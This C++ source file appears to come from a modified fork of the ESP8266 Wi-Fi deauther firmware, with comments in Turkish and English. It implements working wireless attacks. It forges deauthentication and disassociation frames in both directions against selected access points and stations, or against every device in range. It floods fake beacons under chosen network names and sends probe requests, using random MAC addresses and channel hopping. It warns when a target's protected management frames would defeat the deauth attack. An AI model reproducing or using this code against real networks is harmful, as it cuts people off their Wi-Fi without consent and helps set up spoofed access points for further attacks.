/* This software is licensed under the MIT License: https://github.com/spacehuhntech/esp8266_deauther */

#include "Attack.h"

#include "settings.h"

// Statik beacon buffer tanımı — sınıf için header'da declare edildi (new/delete yok)
uint8_t Attack::beaconBuf[128];

Attack::Attack() {
    getRandomMac(mac);

    if (settings::getAttackSettings().beacon_interval == INTERVAL_1S) {
        // 1s beacon interval
        beaconPacket[32] = 0xe8;
        beaconPacket[33] = 0x03;
    } else {
        // 100ms beacon interval
        beaconPacket[32] = 0x64;
        beaconPacket[33] = 0x00;
    }

    deauth.time = currentTime;
    beacon.time = currentTime;
    probe.time  = currentTime;
}

void Attack::start() {
    stop();
    prntln(A_START);
    attackTime      = currentTime;
    attackStartTime = currentTime;
    accesspoints.sortAfterChannel();
    stations.sortAfterChannel();
    running = true;
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    Attack::beacon.active = beacon;
    Attack::deauth.active = deauth || deauthAll;
    Attack::deauthAll     = deauthAll;
    Attack::probe.active  = probe;

    Attack::output  = output;
    Attack::timeout = timeout;

    // if (((beacon || probe) && ssids.count() > 0) || (deauthAll && scan.countAll() > 0) || (deauth &&
    // scan.countSelected() > 0)){
    if (beacon || probe || deauthAll || deauth) {
        if (deauth || deauthAll) {
            bool hasPmfTarget = false;
            if (deauthAll) {
                for (int i = 0; i < accesspoints.count(); i++) {
                    if (accesspoints.getPmf(i)) {
                        hasPmfTarget = true;
                        break;
                    }
                }
            } else {
                for (int i = 0; i < accesspoints.count(); i++) {
                    if (accesspoints.getSelected(i) && accesspoints.getPmf(i)) {
                        hasPmfTarget = true;
                        break;
                    }
                }
            }
            if (hasPmfTarget) {
                prntln("[WARNING] Target network has PMF (Protected Management Frames) enabled!");
                prntln("[WARNING] Deauth attacks will NOT work against PMF networks!");
            }
        }
        start();
    } else {
        prntln(A_NO_MODE_ERROR);
        accesspoints.sort();
        stations.sort();
        stop();
    }
}

void Attack::stop() {
    if (running) {
        running              = false;
        deauthPkts           = 0;
        beaconPkts           = 0;
        probePkts            = 0;
        deauth.packetCounter = 0;
        beacon.packetCounter = 0;
        probe.packetCounter  = 0;
        deauth.maxPkts       = 0;
        beacon.maxPkts       = 0;
        probe.maxPkts        = 0;
        packetRate           = 0;
        deauth.tc            = 0;
        beacon.tc            = 0;
        probe.tc             = 0;
        deauth.active        = false;
        beacon.active        = false;
        probe.active         = false;
        prntln(A_STOP);
    }
}

bool Attack::isRunning() {
    return running;
}

void Attack::updateCounter() {
    // stop when timeout is active and time is up
    if ((timeout > 0) && (currentTime - attackStartTime >= timeout)) {
        prntln(A_TIMEOUT);
        stop();
        return;
    }

    // settings'i tek seferde oku — her dalında ayrı struct erişimi yok
    const auto& as = settings::getAttackSettings();

    // deauth packets per second
    if (deauth.active) {
        if (deauthAll) deauth.maxPkts = as.deauths_per_target *
                                        (accesspoints.count() + stations.count() * 2 - names.selected());
        else deauth.maxPkts = as.deauths_per_target *
                              (accesspoints.selected() + stations.selected() * 2 + names.selected() + names.stations());
        if (deauth.maxPkts > MAX_DEAUTH_PKTS_PER_SEC) {
            deauth.maxPkts = MAX_DEAUTH_PKTS_PER_SEC;
        }
    } else {
        deauth.maxPkts = 0;
    }

    // beacon packets per second
    if (beacon.active) {
        beacon.maxPkts = ssids.count();
        if (as.beacon_interval == INTERVAL_100MS) beacon.maxPkts *= 10;
    } else {
        beacon.maxPkts = 0;
    }

    // probe packets per second
    if (probe.active) probe.maxPkts = ssids.count() * as.probe_frames_per_ssid;
    else probe.maxPkts = 0;

    // random transmission power
    if (as.random_tx && (beacon.active || probe.active)) setOutputPower(random(21));
    else setOutputPower(TX_POWER);

    // reset counters
    deauthPkts           = deauth.packetCounter;
    beaconPkts           = beacon.packetCounter;
    probePkts            = probe.packetCounter;
    packetRate           = tmpPacketRate;
    deauth.packetCounter = 0;
    beacon.packetCounter = 0;
    probe.packetCounter  = 0;
    deauth.tc            = 0;
    beacon.tc            = 0;
    probe.tc             = 0;
    tmpPacketRate        = 0;
}

void Attack::status() {
    char s[120];

    sprintf(s, str(
                A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts,
            probe.maxPkts);
    prnt(String(s));
}

String Attack::getStatusJSON() {
    // snprintf ile sabit stack buffer — 15+ heap alloc yerine tek String oluşturma
    char buf[128];
    snprintf_P(buf, sizeof(buf),
        PSTR("[[%s,%u,%u,%u],[%s,%u,%u,%u],[%s,%u,%u,%u],%u]"),
        deauth.active ? "true" : "false",
        (unsigned)scan.countSelected(), (unsigned)deauthPkts, (unsigned)deauth.maxPkts,
        beacon.active ? "true" : "false",
        (unsigned)ssids.count(), (unsigned)beaconPkts, (unsigned)beacon.maxPkts,
        probe.active  ? "true" : "false",
        (unsigned)ssids.count(), (unsigned)probePkts, (unsigned)probe.maxPkts,
        (unsigned)packetRate
    );
    return String(buf);
}

void Attack::update() {
    if (!running || scan.isScanning()) return;

    apCount = accesspoints.count();
    stCount = stations.count();
    nCount  = names.count();

    // run/update all attacks
    deauthUpdate();
    deauthAllUpdate();
    beaconUpdate();
    probeUpdate();

    // each second
    if (currentTime - attackTime > 1000) {
        attackTime = currentTime; // update time
        updateCounter();

        if (output) status();     // status update
        getRandomMac(mac);        // generate new random mac
    }
}

void Attack::deauthUpdate() {
    if (!deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                if (accesspoints.getSelected(deauth.tc)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                if (stations.getSelected(deauth.tc - apCount)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < nCount + stCount + apCount)) {
                if (names.getSelected(deauth.tc - stCount - apCount)) {
                    deauth.tc += deauthName(deauth.tc - stCount - apCount);
                } else deauth.tc++;
            }

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::deauthAllUpdate() {
    if (deauthAll && deauth.active && (deauth.maxPkts > 0) && (deauth.packetCounter < deauth.maxPkts)) {
        if (deauth.time <= currentTime - (1000 / deauth.maxPkts)) {
            // APs
            if ((apCount > 0) && (deauth.tc < apCount)) {
                tmpID = names.findID(accesspoints.getMac(deauth.tc));

                if (tmpID < 0) {
                    deauth.tc += deauthAP(deauth.tc);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthAP(deauth.tc);
                } else deauth.tc++;
            }

            // Stations
            else if ((stCount > 0) && (deauth.tc >= apCount) && (deauth.tc < stCount + apCount)) {
                tmpID = names.findID(stations.getMac(deauth.tc - apCount));

                if (tmpID < 0) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else if (!names.getSelected(tmpID)) {
                    deauth.tc += deauthStation(deauth.tc - apCount);
                } else deauth.tc++;
            }

            // Names
            else if ((nCount > 0) && (deauth.tc >= apCount + stCount) && (deauth.tc < apCount + stCount + nCount)) {
                if (!names.getSelected(deauth.tc - apCount - stCount)) {
                    deauth.tc += deauthName(deauth.tc - apCount - stCount);
                } else deauth.tc++;
            }

            // reset counter
            if (deauth.tc >= nCount + stCount + apCount) deauth.tc = 0;
        }
    }
}

void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            if (settings::getAttackSettings().attack_all_ch) setWifiChannel(probe.tc % 11, true);
            probe.tc += sendProbe(probe.tc);

            if (probe.tc >= ssids.count()) probe.tc = 0;
        }
    }
}

void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            beacon.tc += sendBeacon(beacon.tc);

            if (beacon.tc >= ssids.count()) beacon.tc = 0;
        }
    }
}

bool Attack::deauthStation(int num) {
    return deauthDevice(stations.getAPMac(num), stations.getMac(num), settings::getAttackSettings().deauth_reason, stations.getCh(num));
}

bool Attack::deauthAP(int num) {
    return deauthDevice(accesspoints.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, accesspoints.getCh(num));
}

bool Attack::deauthName(int num) {
    if (names.isStation(num)) {
        return deauthDevice(names.getBssid(num), names.getMac(num), settings::getAttackSettings().deauth_reason, names.getCh(num));
    } else {
        return deauthDevice(names.getMac(num), broadcast, settings::getAttackSettings().deauth_reason, names.getCh(num));
    }
}

bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!stMac) return false;  // exit when station mac is null

    // Tek 26-byte buffer; disassoc ve yön değişiminde in-place byte değiştirme yapılır
    uint8_t pkt[26];
    memcpy(pkt, deauthPacket, 26);
    memcpy(&pkt[4],  stMac, 6);
    memcpy(&pkt[10], apMac, 6);
    memcpy(&pkt[16], apMac, 6);
    pkt[24] = reason;

    bool success = false;

    // 1) Deauth: AP -> STA
    pkt[0] = 0xC0;
    if (sendPacket(pkt, 26, ch, true))  { success = true; deauth.packetCounter++; }

    // 2) Disassoc: AP -> STA (sadece frame type byte değişir)
    pkt[0] = 0xA0;
    if (sendPacket(pkt, 26, ch, false)) { success = true; deauth.packetCounter++; }

    // Broadcast'e gönderilmiyorsa ters yönde de paket gönder (STA -> AP)
    if (!macBroadcast(stMac)) {
        // In-place adres değişimi — yeni buffer ayrimi yok
        memcpy(&pkt[4],  apMac, 6);
        memcpy(&pkt[10], stMac, 6);
        memcpy(&pkt[16], stMac, 6);

        // 3) Deauth: STA -> AP
        pkt[0] = 0xC0;
        if (sendPacket(pkt, 26, ch, false)) { success = true; deauth.packetCounter++; }

        // 4) Disassoc: STA -> AP
        pkt[0] = 0xA0;
        if (sendPacket(pkt, 26, ch, false)) { success = true; deauth.packetCounter++; }
    }

    if (success) deauth.time = currentTime;

    return success;
}

bool Attack::sendBeacon(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendBeacon(mac, ssids.getName(tc).c_str(), wifi_channel, ssids.getWPA2(tc));
}

bool Attack::sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    uint16_t pktSize = sizeof(beaconPacket);

    beaconPacket[34] = wpa2 ? 0x31 : 0x21;
    if (!wpa2) pktSize -= 26;

    uint8_t ssidLen = (uint8_t)strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);
    beaconPacket[82] = ch;

    // Statik beaconBuf kullan — new/delete heap alloc tamamen kaldırıldı
    // maksimum boyut: sizeof(beaconPacket) = 109 byte, 128 byte buffer yeterli
    uint16_t txSize = (pktSize - 32) + ssidLen;  // her zaman <= 109
    uint8_t* p      = beaconBuf;

    memcpy(p, beaconPacket, 38 + ssidLen);              // header + SSID data
    p[37] = ssidLen;                                    // SSID length byte güncelle
    memcpy(p + 38 + ssidLen, beaconPacket + 70, wpa2 ? 39 : 13); // rates + channel [+ RSN]

    bool success = sendPacket(beaconBuf, txSize, ch, false);

    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    return success;
}

bool Attack::sendProbe(uint8_t tc) {
    if (settings::getAttackSettings().attack_all_ch) setWifiChannel(tc % 11, true);
    mac[5] = tc;
    return sendProbe(mac, ssids.getName(tc).c_str(), wifi_channel);
}

bool Attack::sendProbe(uint8_t* mac, const char* ssid, uint8_t ch) {
    packetSize = sizeof(probePacket);
    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&probePacket[10], mac, 6);
    memcpy(&probePacket[26], ssid, ssidLen);

    if (sendPacket(probePacket, packetSize, ch, false)) {
        probe.time = currentTime;
        probe.packetCounter++;
        return true;
    }

    return false;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    // Serial.println(bytesToStr(packet, packetSize));

    // set channel
    setWifiChannel(ch, force_ch);

    // sent out packet
    bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

    if (sent) ++tmpPacketRate;

    return sent;
}

void Attack::enableOutput() {
    output = true;
    prntln(A_ENABLED_OUTPUT);
}

void Attack::disableOutput() {
    output = false;
    prntln(A_DISABLED_OUTPUT);
}

uint32_t Attack::getDeauthPkts() {
    return deauthPkts;
}

uint32_t Attack::getBeaconPkts() {
    return beaconPkts;
}

uint32_t Attack::getProbePkts() {
    return probePkts;
}

uint32_t Attack::getDeauthMaxPkts() {
    return deauth.maxPkts;
}

uint32_t Attack::getBeaconMaxPkts() {
    return beacon.maxPkts;
}

uint32_t Attack::getProbeMaxPkts() {
    return probe.maxPkts;
}

uint32_t Attack::getPacketRate() {
    return packetRate;
}